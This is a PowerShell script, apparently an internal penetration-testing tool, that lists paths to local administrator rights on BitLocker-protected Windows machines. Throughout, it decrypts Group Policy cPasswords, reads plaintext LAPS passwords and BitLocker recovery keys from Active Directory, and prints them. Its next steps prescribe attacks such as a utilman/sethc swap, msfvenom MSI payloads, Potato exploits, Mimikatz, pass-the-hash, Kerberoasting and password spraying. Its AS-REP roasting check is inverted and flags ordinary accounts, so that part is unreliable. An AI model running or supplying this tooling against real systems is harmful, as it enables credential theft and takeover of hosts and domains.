<#
.SYNOPSIS
    Enumerate viable paths to local administrator rights on a BitLocker-protected
    target. AUTHORIZED INTERNAL PENETRATION TESTING ONLY.

.DESCRIPTION
    Read-only reconnaissance. It reports which attack paths are OPEN / MAYBE /
    CLOSED with a recommended next step. It performs NO exploitation by default.

    Modes (run the appropriate one from the right context):
      -Physical   BitLocker / volume / offline-artifact recon.
                  Run from any Windows with PowerShell that can see the disk:
                  a Windows PE (with PowerShell added), a live Windows, or even
                  the target itself if you have a shell. Also usable in WinRE if
                  PowerShell was injected there.
      -Local      Local privilege-escalation recon.
                  Run ON the target with any foothold shell (standard user is fine).
      -AD         Domain recon from a networked attacker box (no physical access
                  needed): BitLocker escrow keys, LAPS, GPP cPassword, AS-REP,
                  Kerberoast, password policy, and basic reachability.
      -All        Attempt everything, skipping gracefully what it cannot reach.

.PARAMETER Mode
    Physical | Local | AD | All (default All).

.PARAMETER Domain
    DNS domain name for LDAP checks. Defaults to the current user's domain.

.PARAMETER Credential
    Optional explicit domain credentials for LDAP binding (Get-Credential).

.PARAMETER Target
    Optional target hostname/IP for reachability checks (445/3389/5985).

.EXAMPLE
    .\Get-LocalAdminPaths.ps1 -Mode Physical
    .\Get-LocalAdminPaths.ps1 -Mode AD -Domain corp.local -Credential (Get-Credential)
    .\Get-LocalAdminPaths.ps1 -Mode Local
    .\Get-LocalAdminPaths.ps1 -Mode All -Domain corp.local -Target FS01
#>

[CmdletBinding()]
param(
    [ValidateSet('Physical','Local','AD','All')]
    [string]$Mode = 'All',

    [string]$Domain = $env:USERDNSDOMAIN,

    [System.Management.Automation.PSCredential]$Credential,

    [string]$Target
)

$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------------------
# Shared plumbing
# ---------------------------------------------------------------------------
$script:Findings = New-Object System.Collections.ArrayList

function Add-Finding {
    param(
        [string]$Category,
        [string]$Check,
        [string]$Status,   # OPEN | MAYBE | CLOSED | INFO | ERR
        [string]$Detail,
        [string]$NextStep = ''
    )
    [void]$script:Findings.Add([pscustomobject]@{
        Category = $Category
        Check    = $Check
        Status   = $Status
        Detail   = $Detail
        NextStep = $NextStep
    })
}

# Decrypt a GPP cPassword (MS14-025 published key).
function ConvertFrom-GPPPassword {
    param([string]$CPassword)
    try {
        $keyHex = '4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
        $key = New-Object byte[] 32
        for ($i = 0; $i -lt 32; $i++) {
            $key[$i] = [Convert]::ToByte($keyHex.Substring($i*2, 2), 16)
        }
        $cipher = [Convert]::FromBase64String($CPassword)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode   = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Key = $key
        $aes.IV  = New-Object byte[] 16
        $dec = $aes.CreateDecryptor()
        $plain = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
        $pad = [int]$plain[$plain.Length - 1]
        if ($pad -gt 0 -and $pad -le 16) {
            $plain = $plain[0..($plain.Length - 1 - $pad)]
        }
        return [System.Text.Encoding]::UTF8.GetString($plain)
    } catch {
        return $null
    }
}

# Check whether the current user can write to a path (file or directory).
function Test-CanWrite {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path)) { return $false }
        $acl  = Get-Acl $Path
        $me   = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $names = @($me.Name)
        foreach ($g in $me.Groups) {
            try { $names += $g.Translate([System.Security.Principal.NTAccount]).Value } catch {}
        }
        foreach ($ace in $acl.Access) {
            if ($ace.AccessControlType -ne 'Allow') { continue }
            $ref = $ace.IdentityReference.Value
            if ($names -contains $ref -or $ref -in @('Everyone','BUILTIN\Users','BUILTIN\Authenticated Users','NT AUTHORITY\INTERACTIVE','BUILTIN\Administrators')) {
                $rw = [System.Security.AccessControl.FileSystemRights]::Write
                $rm = [System.Security.AccessControl.FileSystemRights]::Modify
                $rf = [System.Security.AccessControl.FileSystemRights]::FullControl
                if (($ace.FileSystemRights -band $rw) -or ($ace.FileSystemRights -band $rm) -or ($ace.FileSystemRights -band $rf)) {
                    return $true
                }
            }
        }
        return $false
    } catch {
        return $false
    }
}

# Build a DirectorySearcher, optionally bound to a domain / credentials.
function New-Searcher {
    param([string]$Filter, [string[]]$Props, [string]$DomainName, [System.Management.Automation.PSCredential]$Cred)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.Filter = $Filter
    $s.PageSize = 1000
    foreach ($p in $Props) { [void]$s.PropertiesToLoad.Add($p) }
    if ($Cred) {
        $entry = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$DomainName", $Cred.UserName, $Cred.GetNetworkCredential().Password)
        $s.SearchRoot = $entry
    } elseif ($DomainName) {
        $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainName")
        $s.SearchRoot = $entry
    }
    return $s
}

function Get-IsAdmin {
    ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ---------------------------------------------------------------------------
# Physical mode: BitLocker / volumes / offline artifacts
# ---------------------------------------------------------------------------
function Get-BdeVolumes {
    $raw = (& manage-bde -status 2>&1) -join "`n"
    if (-not $raw) { return $null }
    $volumes = @()
    $cur = $null
    foreach ($line in ($raw -split "`r?`n")) {
        if ($line -match '^\s*Volume\s+([A-Za-z]:)\s*\[(.+?)\]') {
            if ($cur) { $volumes += $cur }
            $cur = [pscustomobject]@{ Drive=$matches[1]; Label=$matches[2]; Conversion=''; Protection=''; Lock=''; Method='' }
        } elseif ($cur) {
            if     ($line -match 'Conversion Status:\s*(.+)') { $cur.Conversion = $matches[1].Trim() }
            elseif ($line -match 'Protection Status:\s*(.+)') { $cur.Protection = $matches[1].Trim() }
            elseif ($line -match 'Lock Status:\s*(.+)')       { $cur.Lock       = $matches[1].Trim() }
            elseif ($line -match 'Encryption Method:\s*(.+)') { $cur.Method     = $matches[1].Trim() }
        }
    }
    if ($cur) { $volumes += $cur }
    return $volumes
}

function Get-BdeProtectors {
    param([string]$Drive)
    $raw = (& manage-bde -protectors -get "$Drive" 2>&1) -join "`n"
    $found = @()
    foreach ($p in @('TPM','Numerical Password','Password','External Key','Startup Key','Certificate','Enhanced PIN')) {
        if ($raw -match "(?m)^\s*$([regex]::Escape($p)):") { $found += $p }
    }
    return $found
}

function Test-OfflineArtifacts {
    param([string]$Drive)
    $root = "$Drive\"
    $hits = @()
    if (-not (Test-Path $root)) { return $hits }
    # Registry hives: reading SAM+SYSTEM+SECURITY enables offline hash dump / reset.
    foreach ($h in @(
        'Windows\System32\config\SAM',
        'Windows\System32\config\SYSTEM',
        'Windows\System32\config\SECURITY',
        'Windows\System32\config\SOFTWARE',
        'Windows\System32\utilman.exe',
        'Windows\System32\sethc.exe')) {
        if (Test-Path ($root + $h)) { $hits += $h }
    }
    # Unattend / autounattend frequently hold embedded admin passwords.
    foreach ($p in @(
        'Windows\Panther\unattend.xml',
        'Windows\Panther\Unattend.xml',
        'Windows\System32\Sysprep\unattend.xml',
        'unattend.xml',
        'Autounattend.xml')) {
        if (Test-Path ($root + $p)) { $hits += $p }
    }
    # Shallow hunt for BitLocker .BEK startup keys / recovery-key text at volume root.
    try {
        $bek = Get-ChildItem -Path $root -File -Depth 1 -Include *.bek,*.BEK -ErrorAction SilentlyContinue |
            Select-Object -First 10 -ExpandProperty FullName
        foreach ($b in $bek) { $hits += $b }
    } catch {}
    return $hits
}

function Invoke-PhysicalChecks {
    Write-Host "[*] Physical / BitLocker recon" -ForegroundColor Cyan

    $isSystem = ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq 'S-1-5-18')
    Add-Finding 'Physical' 'Current execution context' $(if ($isSystem) {'INFO'} else {'INFO'}) `
        ("Running as: " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name) `
        "WinRE gives SYSTEM; PowerShell is not present in default WinRE - use the CMD commands in the report."

    $volumes = Get-BdeVolumes
    if (-not $volumes) {
        Add-Finding 'Physical' 'manage-bde -status' 'ERR' `
            "manage-bde unavailable or insufficient privileges (non-admin on a full OS returns limited info)." `
            "Run from WinRE (Shift+F10) or a Windows PE as SYSTEM."
        return
    }

    foreach ($v in $volumes) {
        $protectors = @(Get-BdeProtectors $v.Drive)
        $protStr = if ($protectors.Count) { ($protectors -join ', ') } else { 'none detected' }

        $unlocked = ($v.Lock -match 'Unlocked')
        $offlineWritable = ($v.Protection -match 'Protection Off') -or ($v.Conversion -match 'Fully Decrypted')

        $detail = "Drive $($v.Drive) [$($v.Label)] | Conversion=$($v.Conversion) | Protection=$($v.Protection) | Lock=$($v.Lock) | Protectors: $protStr"
        Add-Finding 'Physical' "BitLocker status $($v.Drive)" $(if ($offlineWritable) {'OPEN'} else {'INFO'}) $detail

        if ($offlineWritable -or $unlocked) {
            $art = Test-OfflineArtifacts $v.Drive
            $hasOS = ($art -match 'Windows\\System32\\config\\SAM')
            if ($art.Count) {
                Add-Finding 'Physical' "Readable artifacts on $($v.Drive)" 'OPEN' `
                    ("Offline-readable: " + ($art -join '; ')) `
                    "Volume is accessible offline. Swap utilman.exe/sethc.exe with cmd.exe (offline edit), or dump SAM/SYSTEM and crack/PTH the local admin hash."
            } else {
                Add-Finding 'Physical' "Volume $($v.Drive) is unlocked/decrypted" 'MAYBE' `
                    "No standard OS artifacts found at expected paths - inspect manually." `
                    "List the volume, look for a Windows install or data worth pulling."
            }
        } else {
            Add-Finding 'Physical' "Volume $($v.Drive) is locked/encrypted" 'CLOSED' `
                "Cannot read offline without the recovery key." `
                "Get the recovery key via AD escrow (run -Mode AD), Entra ID, USB .BEK, or a memory attack on a running box."
        }

        if ($protectors -contains 'Numerical Password') {
            Add-Finding 'Physical' "Recovery key protector on $($v.Drive)" 'INFO' `
                "A 48-digit recovery password exists; you need its value." `
                "Pull it from AD (msFVE-RecoveryInformation) or the owner, then: manage-bde -unlock $($v.Drive) -RecoveryPassword <key>"
        }
        if ($protectors -contains 'TPM' -and -not ($protectors -contains 'Numerical Password')) {
            Add-Finding 'Physical' "TPM-only protector on $($v.Drive)" 'INFO' `
                "Key auto-releases to the running OS; offline you see only ciphertext." `
                "Consider DMA/cold-boot memory extraction, or recover the key from AD/Entra."
        }
    }
}

# ---------------------------------------------------------------------------
# Local mode: privilege-escalation recon on the target
# ---------------------------------------------------------------------------
function Invoke-LocalChecks {
    Write-Host "[*] Local privilege-escalation recon" -ForegroundColor Cyan

    $who = whoami 2>&1 | Out-String
    Add-Finding 'Local' 'Current identity' 'INFO' ("$($who.Trim()) | Local admin: $(Get-IsAdmin)") `
        $(if (Get-IsAdmin) {'You already have admin - game over (in a good way).'} else {'Continue with escalation checks below.'})

    # Token privileges
    $privRaw = (& whoami /priv 2>&1) -join "`n"
    $privMap = @{
        'SeImpersonatePrivilege'     = 'Potato family (JuicyPotato/SweetPotato/PrintSpoofer) -> SYSTEM'
        'SeAssignPrimaryTokenPrivilege' = 'Potato family -> SYSTEM'
        'SeDebugPrivilege'           = 'Inject into a SYSTEM process / dump LSASS'
        'SeBackupPrivilege'          = 'Dump SAM/SYSTEM hashes and pass-the-hash'
        'SeRestorePrivilege'         = 'Load drivers / manipulate files as SYSTEM'
        'SeTakeOwnershipPrivilege'   = 'Take ownership of protected files'
        'SeLoadDriverPrivilege'      = 'Load a vulnerable driver -> kernel/SYSTEM'
        'SeTcbPrivilege'             = 'Act as part of the OS -> token creation'
    }
    foreach ($k in $privMap.Keys) {
        $enabled = $false
        if ($privRaw -match "(?m)^\s*$k\s+(Enabled|Disabled)") { $enabled = ($matches[1] -eq 'Enabled') }
        if ($privRaw -match [regex]::Escape($k)) {
            Add-Finding 'Local' "Privilege: $k" $(if ($enabled) {'OPEN'} else {'INFO'}) `
                ("Present (enabled=$enabled)") $privMap[$k]
        }
    }

    # AlwaysInstallElevated
    $hk = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $cu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if ($hk -eq 1 -and $cu -eq 1) {
        Add-Finding 'Local' 'AlwaysInstallElevated' 'OPEN' 'Both HKLM and HKCU are set to 1.' `
            "Build an .msi (msfvenom windows/exec) and run: msiexec /quiet /qn /i payload.msi -> SYSTEM shell."
    } else {
        Add-Finding 'Local' 'AlwaysInstallElevated' 'CLOSED' "HKLM=$hk HKCU=$cu (need both =1)"
    }

    # Service misconfigurations
    $svcCount = 0
    try {
        $services = Get-CimInstance Win32_Service
        foreach ($svc in $services) {
            if (-not $svc.PathName) { continue }
            $path = $svc.PathName.Trim()
            $bin = $null
            if ($path.StartsWith('"')) {
                $m = [regex]::Match($path, '^"([^"]+)"')
                if ($m.Success) { $bin = $m.Groups[1].Value }
            } else {
                $first = ($path -split '\s+')[0]
                $first = $first -replace '^\\SystemRoot', $env:SystemRoot
                $first = $first -replace '^\\\?\?\\', ''
                $bin = $first
            }
            if ($bin -and $svc.StartMode -ne 'Disabled') {
                $svcCount++
                $unquoted = ($path -notmatch '^\s*"' -and $path -match '\s' -and $path -match '\.exe')
                if ($unquoted) {
                    Add-Finding 'Local' "Unquoted service path: $($svc.Name)" 'OPEN' `
                        "PathName = $path" `
                        "Place a malicious .exe in the unquoted segment (e.g. C:\Program.exe or C:\Program Files\...)."
                }
                $target = if ($bin -and (Test-Path $bin)) { $bin } elseif ($bin) { Split-Path $bin -Parent } else { $null }
                if ($target -and (Test-CanWrite $target)) {
                    Add-Finding 'Local' "Writable service binary/dir: $($svc.Name)" 'OPEN' `
                        "Current user can write to $target (runs as $($svc.StartName))" `
                        "Replace the binary (or drop a DLL alongside) and restart the service / reboot for a shell as its account."
                }
            }
        }
    } catch {
        Add-Finding 'Local' 'Service enumeration' 'ERR' "Could not enumerate services: $_"
    }
    Add-Finding 'Local' 'Services scanned' 'INFO' "$svcCount non-disabled services examined."

    # Local admin membership
    try {
        $admins = Get-LocalGroupMember -Group Administrators -ErrorAction Stop | ForEach-Object { "$($_.Name) ($($_.ObjectClass), $($_.PrincipalSource))" }
        Add-Finding 'Local' 'Local Administrators group' 'INFO' ($admins -join '; ')
    } catch {
        Add-Finding 'Local' 'Local Administrators group' 'INFO' "Cannot enumerate (usually fine as non-admin): $_"
    }

    # LAPS presence / local admin password source
    $legacyLaps = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd' -ErrorAction SilentlyContinue
    $winLaps    = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\LAPS' -ErrorAction SilentlyContinue
    if ($legacyLaps -or $winLaps) {
        Add-Finding 'Local' 'LAPS is in use' 'INFO' `
            "LAPS manages the local admin password (random, rotated)." `
            "Recover it from AD instead (run -Mode AD): ms-Mcs-AdmPwd (legacy) or msLAPS-EncryptedPassword."
    } else {
        Add-Finding 'Local' 'LAPS not detected locally' 'MAYBE' `
            "Local admin password may be static and shared across hosts." `
            "Dump the local admin hash (if you get admin here) and spray/PTH it across the estate."
    }

    # LocalAccountTokenFilterPolicy + UAC
    $ltp = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LocalAccountTokenFilterPolicy -ErrorAction SilentlyContinue).LocalAccountTokenFilterPolicy
    $lua = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name EnableLUA -ErrorAction SilentlyContinue).EnableLUA
    $consent = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name ConsentPromptBehaviorAdmin -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
    Add-Finding 'Local' 'Remote local-admin PTH (LocalAccountTokenFilterPolicy)' $(if ($ltp -eq 1) {'OPEN'} else {'CLOSED'}) `
        "LocalAccountTokenFilterPolicy=$ltp" `
        "If 1, remote PTH with a local admin hash works from the network (no UAC filtering)."
    Add-Finding 'Local' 'UAC posture' 'INFO' "EnableLUA=$lua ConsentPromptBehaviorAdmin=$consent (0 = no prompt)"

    # Stored credentials
    $cmdkey = (& cmdkey /list 2>&1) -join "`n"
    if ($cmdkey -match 'Target:') {
        Add-Finding 'Local' 'Stored credentials (cmdkey)' 'OPEN' `
            "Windows Credential Manager contains saved targets." `
            "Reuse them (runas /savecred, or extract with Mimikatz sekurlsa::credentials when elevated)."
    } else {
        Add-Finding 'Local' 'Stored credentials (cmdkey)' 'INFO' 'No cmdkey targets found for this user.'
    }
}

# ---------------------------------------------------------------------------
# AD mode: domain recon from the attacker box
# ---------------------------------------------------------------------------
function Invoke-AdChecks {
    Write-Host "[*] Domain / network recon" -ForegroundColor Cyan
    if (-not $Domain) {
        Add-Finding 'AD' 'Domain context' 'ERR' "No domain detected. Pass -Domain corp.local and optionally -Credential."
        return
    }
    Add-Finding 'AD' 'Target domain' 'INFO' $Domain

    # --- BitLocker recovery keys escrowed in AD ---
    try {
        $s = New-Searcher -Filter "(&(objectClass=msFVE-RecoveryInformation))" `
            -Props @('msFVE-RecoveryPassword','distinguishedName') -DomainName $Domain -Cred $Credential
        $r = $s.FindAll()
        if ($r.Count -gt 0) {
            $sample = @()
            $i = 0
            foreach ($x in $r) {
                if ($i -lt 5) { $sample += ($x.Properties['distinguishedName'] -join '') }
                $i++
            }
            Add-Finding 'AD' 'BitLocker recovery keys in AD' 'OPEN' `
                "$($r.Count) msFVE-RecoveryInformation object(s) found (e.g. $($sample -join ' | '))" `
                "Read msFVE-RecoveryPassword for the target machine -> unlock the volume offline -> utilman/SAM path."
        } else {
            Add-Finding 'AD' 'BitLocker recovery keys in AD' 'CLOSED' 'No escrowed keys found (or no read permission).'
        }
    } catch {
        Add-Finding 'AD' 'BitLocker recovery keys in AD' 'ERR' "LDAP query failed: $_"
    }

    # --- LAPS (legacy + Windows LAPS) ---
    try {
        $s = New-Searcher -Filter "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))" `
            -Props @('name','ms-Mcs-AdmPwd') -DomainName $Domain -Cred $Credential
        $r = $s.FindAll()
        if ($r.Count -gt 0) {
            $first = ($r[0].Properties['name'] -join '')
            $pw    = ($r[0].Properties['ms-Mcs-AdmPwd'] -join '')
            Add-Finding 'AD' 'Legacy LAPS passwords readable' 'OPEN' `
                "$($r.Count) computer(s) expose ms-Mcs-AdmPwd (e.g. $first : $pw)" `
                "Use the plaintext local admin password directly (RDP/WinRM/PTH)."
        } else {
            Add-Finding 'AD' 'Legacy LAPS passwords' 'CLOSED' 'No ms-Mcs-AdmPwd values readable.'
        }
    } catch { Add-Finding 'AD' 'Legacy LAPS' 'ERR' "LDAP query failed: $_" }

    try {
        $s = New-Searcher -Filter "(&(objectCategory=computer)(msLAPS-EncryptedPassword=*))" `
            -Props @('name','msLAPS-EncryptedPassword') -DomainName $Domain -Cred $Credential
        $r = $s.FindAll()
        if ($r.Count -gt 0) {
            Add-Finding 'AD' 'Windows LAPS (encrypted) present' 'MAYBE' `
                "$($r.Count) computer(s) use encrypted Windows LAPS passwords." `
                "Decrypt with the LAPS encryption key/cert (requires the right perms), or read msLAPS-Password if legacy mode."
        } else {
            Add-Finding 'AD' 'Windows LAPS (encrypted)' 'INFO' 'No encrypted Windows LAPS passwords found.'
        }
    } catch { Add-Finding 'AD' 'Windows LAPS (encrypted)' 'ERR' "LDAP query failed: $_" }

    # --- GPP cPassword in SYSVOL ---
    try {
        $sysvol = "\\$Domain\SYSVOL\$Domain\Policies"
        $found = 0
        if (Test-Path $sysvol) {
            $files = Get-ChildItem -Path $sysvol -Recurse -File -Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,Drives.xml,Printers.xml -ErrorAction SilentlyContinue
            foreach ($f in $files) {
                try {
                    [xml]$xml = Get-Content -Path $f.FullName -ErrorAction Stop
                    $nodes = $xml.SelectNodes("//*[@cpassword]")
                    foreach ($n in $nodes) {
                        $plain = ConvertFrom-GPPPassword $n.cpassword
                        $user = $n.GetAttribute('userName')
                        if ($plain) {
                            $found++
                            Add-Finding 'AD' 'GPP cPassword' 'OPEN' `
                                "$($f.FullName) -> user=$user pass=$plain" `
                                "Login as this local/domain admin (the cPassword is decrypted)."
                        }
                    }
                } catch {}
            }
        }
        if ($found -eq 0) {
            Add-Finding 'AD' 'GPP cPassword' 'CLOSED' 'No decrypted cPassword values found in SYSVOL.'
        }
    } catch {
        Add-Finding 'AD' 'GPP cPassword' 'ERR' "SYSVOL unreachable or unreadable: $_"
    }

    # --- AS-REP roastable accounts ---
    try {
        # UF_DONT_REQUIRE_PREAUTH = 0x400000 (4194304). Users WITHOUT that bit (and enabled) are roastable.
        $s = New-Searcher -Filter "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=4194304))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
            -Props @('samaccountname') -DomainName $Domain -Cred $Credential
        $r = $s.FindAll()
        if ($r.Count -gt 0) {
            $names = @(); $i = 0
            foreach ($x in $r) { if ($i -lt 10) { $names += ($x.Properties['samaccountname'] -join '') }; $i++ }
            Add-Finding 'AD' 'AS-REP roastable accounts' 'OPEN' `
                "$($r.Count) candidate(s): $($names -join ', ')" `
                "Get TGTs: Rubeus.exe asreproast /nowrap, or impacket GetNPUsers; crack offline, then use the creds."
        } else {
            Add-Finding 'AD' 'AS-REP roastable accounts' 'CLOSED' 'No users without pre-authentication found.'
        }
    } catch { Add-Finding 'AD' 'AS-REP roastable accounts' 'ERR' "LDAP query failed: $_" }

    # --- Kerberoastable accounts ---
    try {
        $s = New-Searcher -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))" `
            -Props @('samaccountname','servicePrincipalName') -DomainName $Domain -Cred $Credential
        $r = $s.FindAll()
        if ($r.Count -gt 0) {
            $names = @(); $i = 0
            foreach ($x in $r) { if ($i -lt 10) { $names += ($x.Properties['samaccountname'] -join '') }; $i++ }
            Add-Finding 'AD' 'Kerberoastable accounts' 'OPEN' `
                "$($r.Count) user account(s) with SPNs: $($names -join ', ')" `
                "Get TGS tickets (Rubeus kerberoast / impacket GetUserSPNs), crack, and check if the account is local admin via GPO."
        } else {
            Add-Finding 'AD' 'Kerberoastable accounts' 'CLOSED' 'No user SPNs found.'
        }
    } catch { Add-Finding 'AD' 'Kerberoastable accounts' 'ERR' "LDAP query failed: $_" }

    # --- Password policy (spraying feasibility) ---
    try {
        $s = New-Searcher -Filter "(objectClass=domainDNS)" `
            -Props @('minPwdLength','lockoutThreshold','lockoutDuration','name') -DomainName $Domain -Cred $Credential
        $r = $s.FindAll()
        if ($r.Count -gt 0) {
            $x = $r[0]
            $minLen = $x.Properties['minPwdLength'] -join ''
            $lockout = $x.Properties['lockoutThreshold'] -join ''
            Add-Finding 'AD' 'Password policy' 'INFO' `
                "minPwdLength=$minLen lockoutThreshold=$lockout" `
                $(if ([int]$lockout -eq 0) {'No lockout -> password spraying is low-risk.'} else {'Lockout enabled -> spray slowly / avoid lockout.'})
        }
    } catch { Add-Finding 'AD' 'Password policy' 'ERR' "LDAP query failed: $_" }

    # --- Reachability to a specific target ---
    if ($Target) {
        foreach ($port in @(445, 3389, 5985)) {
            $ok = Test-NetConnection -ComputerName $Target -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue
            Add-Finding 'AD' "Reachability $Target`:$port" $(if ($ok) {'INFO'} else {'CLOSED'}) `
                "$(if ($ok) {'open'} else {'closed/filtered'})" `
                $(if ($port -eq 445 -and $ok) {'SMB reachable: try SMB relay / PTH.'} elseif ($port -eq 5985 -and $ok) {'WinRM reachable: try evil-winrm with creds.'} elseif ($port -eq 3389 -and $ok) {'RDP reachable.'} else {''})
        }
    }
}

# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "Get-LocalAdminPaths - authorized internal pentest enumeration" -ForegroundColor Yellow
Write-Host "Mode: $Mode   Domain: $($Domain)   Target: $($Target)" -ForegroundColor Yellow
Write-Host ""

if ($Mode -in @('Physical','All')) { Invoke-PhysicalChecks }
if ($Mode -in @('Local','All'))    { Invoke-LocalChecks }
if ($Mode -in @('AD','All'))       { Invoke-AdChecks }

# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "===== OPEN / LIKELY PATHS =====" -ForegroundColor Cyan
$open = @($script:Findings | Where-Object { $_.Status -in @('OPEN','MAYBE') })
if ($open.Count -eq 0) {
    Write-Host "No high-confidence open path found with current access. Expand scope:" -ForegroundColor Yellow
    Write-Host "  - Pull BitLocker key from AD/Entra (need creds) -> unlock -> offline swap"
    Write-Host "  - Run network attacks (Responder + relay, spray, kerberoast) for creds"
    Write-Host "  - Memory attack (DMA/cold boot) against a running TPM-unlocked box"
} else {
    $open | ForEach-Object {
        Write-Host ("[{0}] {1}" -f $_.Category, $_.Check) -ForegroundColor Green
        if ($_.Detail)     { Write-Host ("    detail: " + $_.Detail) -ForegroundColor DarkGray }
        if ($_.NextStep)   { Write-Host ("    next:   " + $_.NextStep) -ForegroundColor Gray }
    }
}

Write-Host ""
Write-Host "===== FULL FINDINGS =====" -ForegroundColor Cyan
$script:Findings | Sort-Object Category, Check |
    Format-Table Category, Check, Status, Detail -AutoSize -Wrap
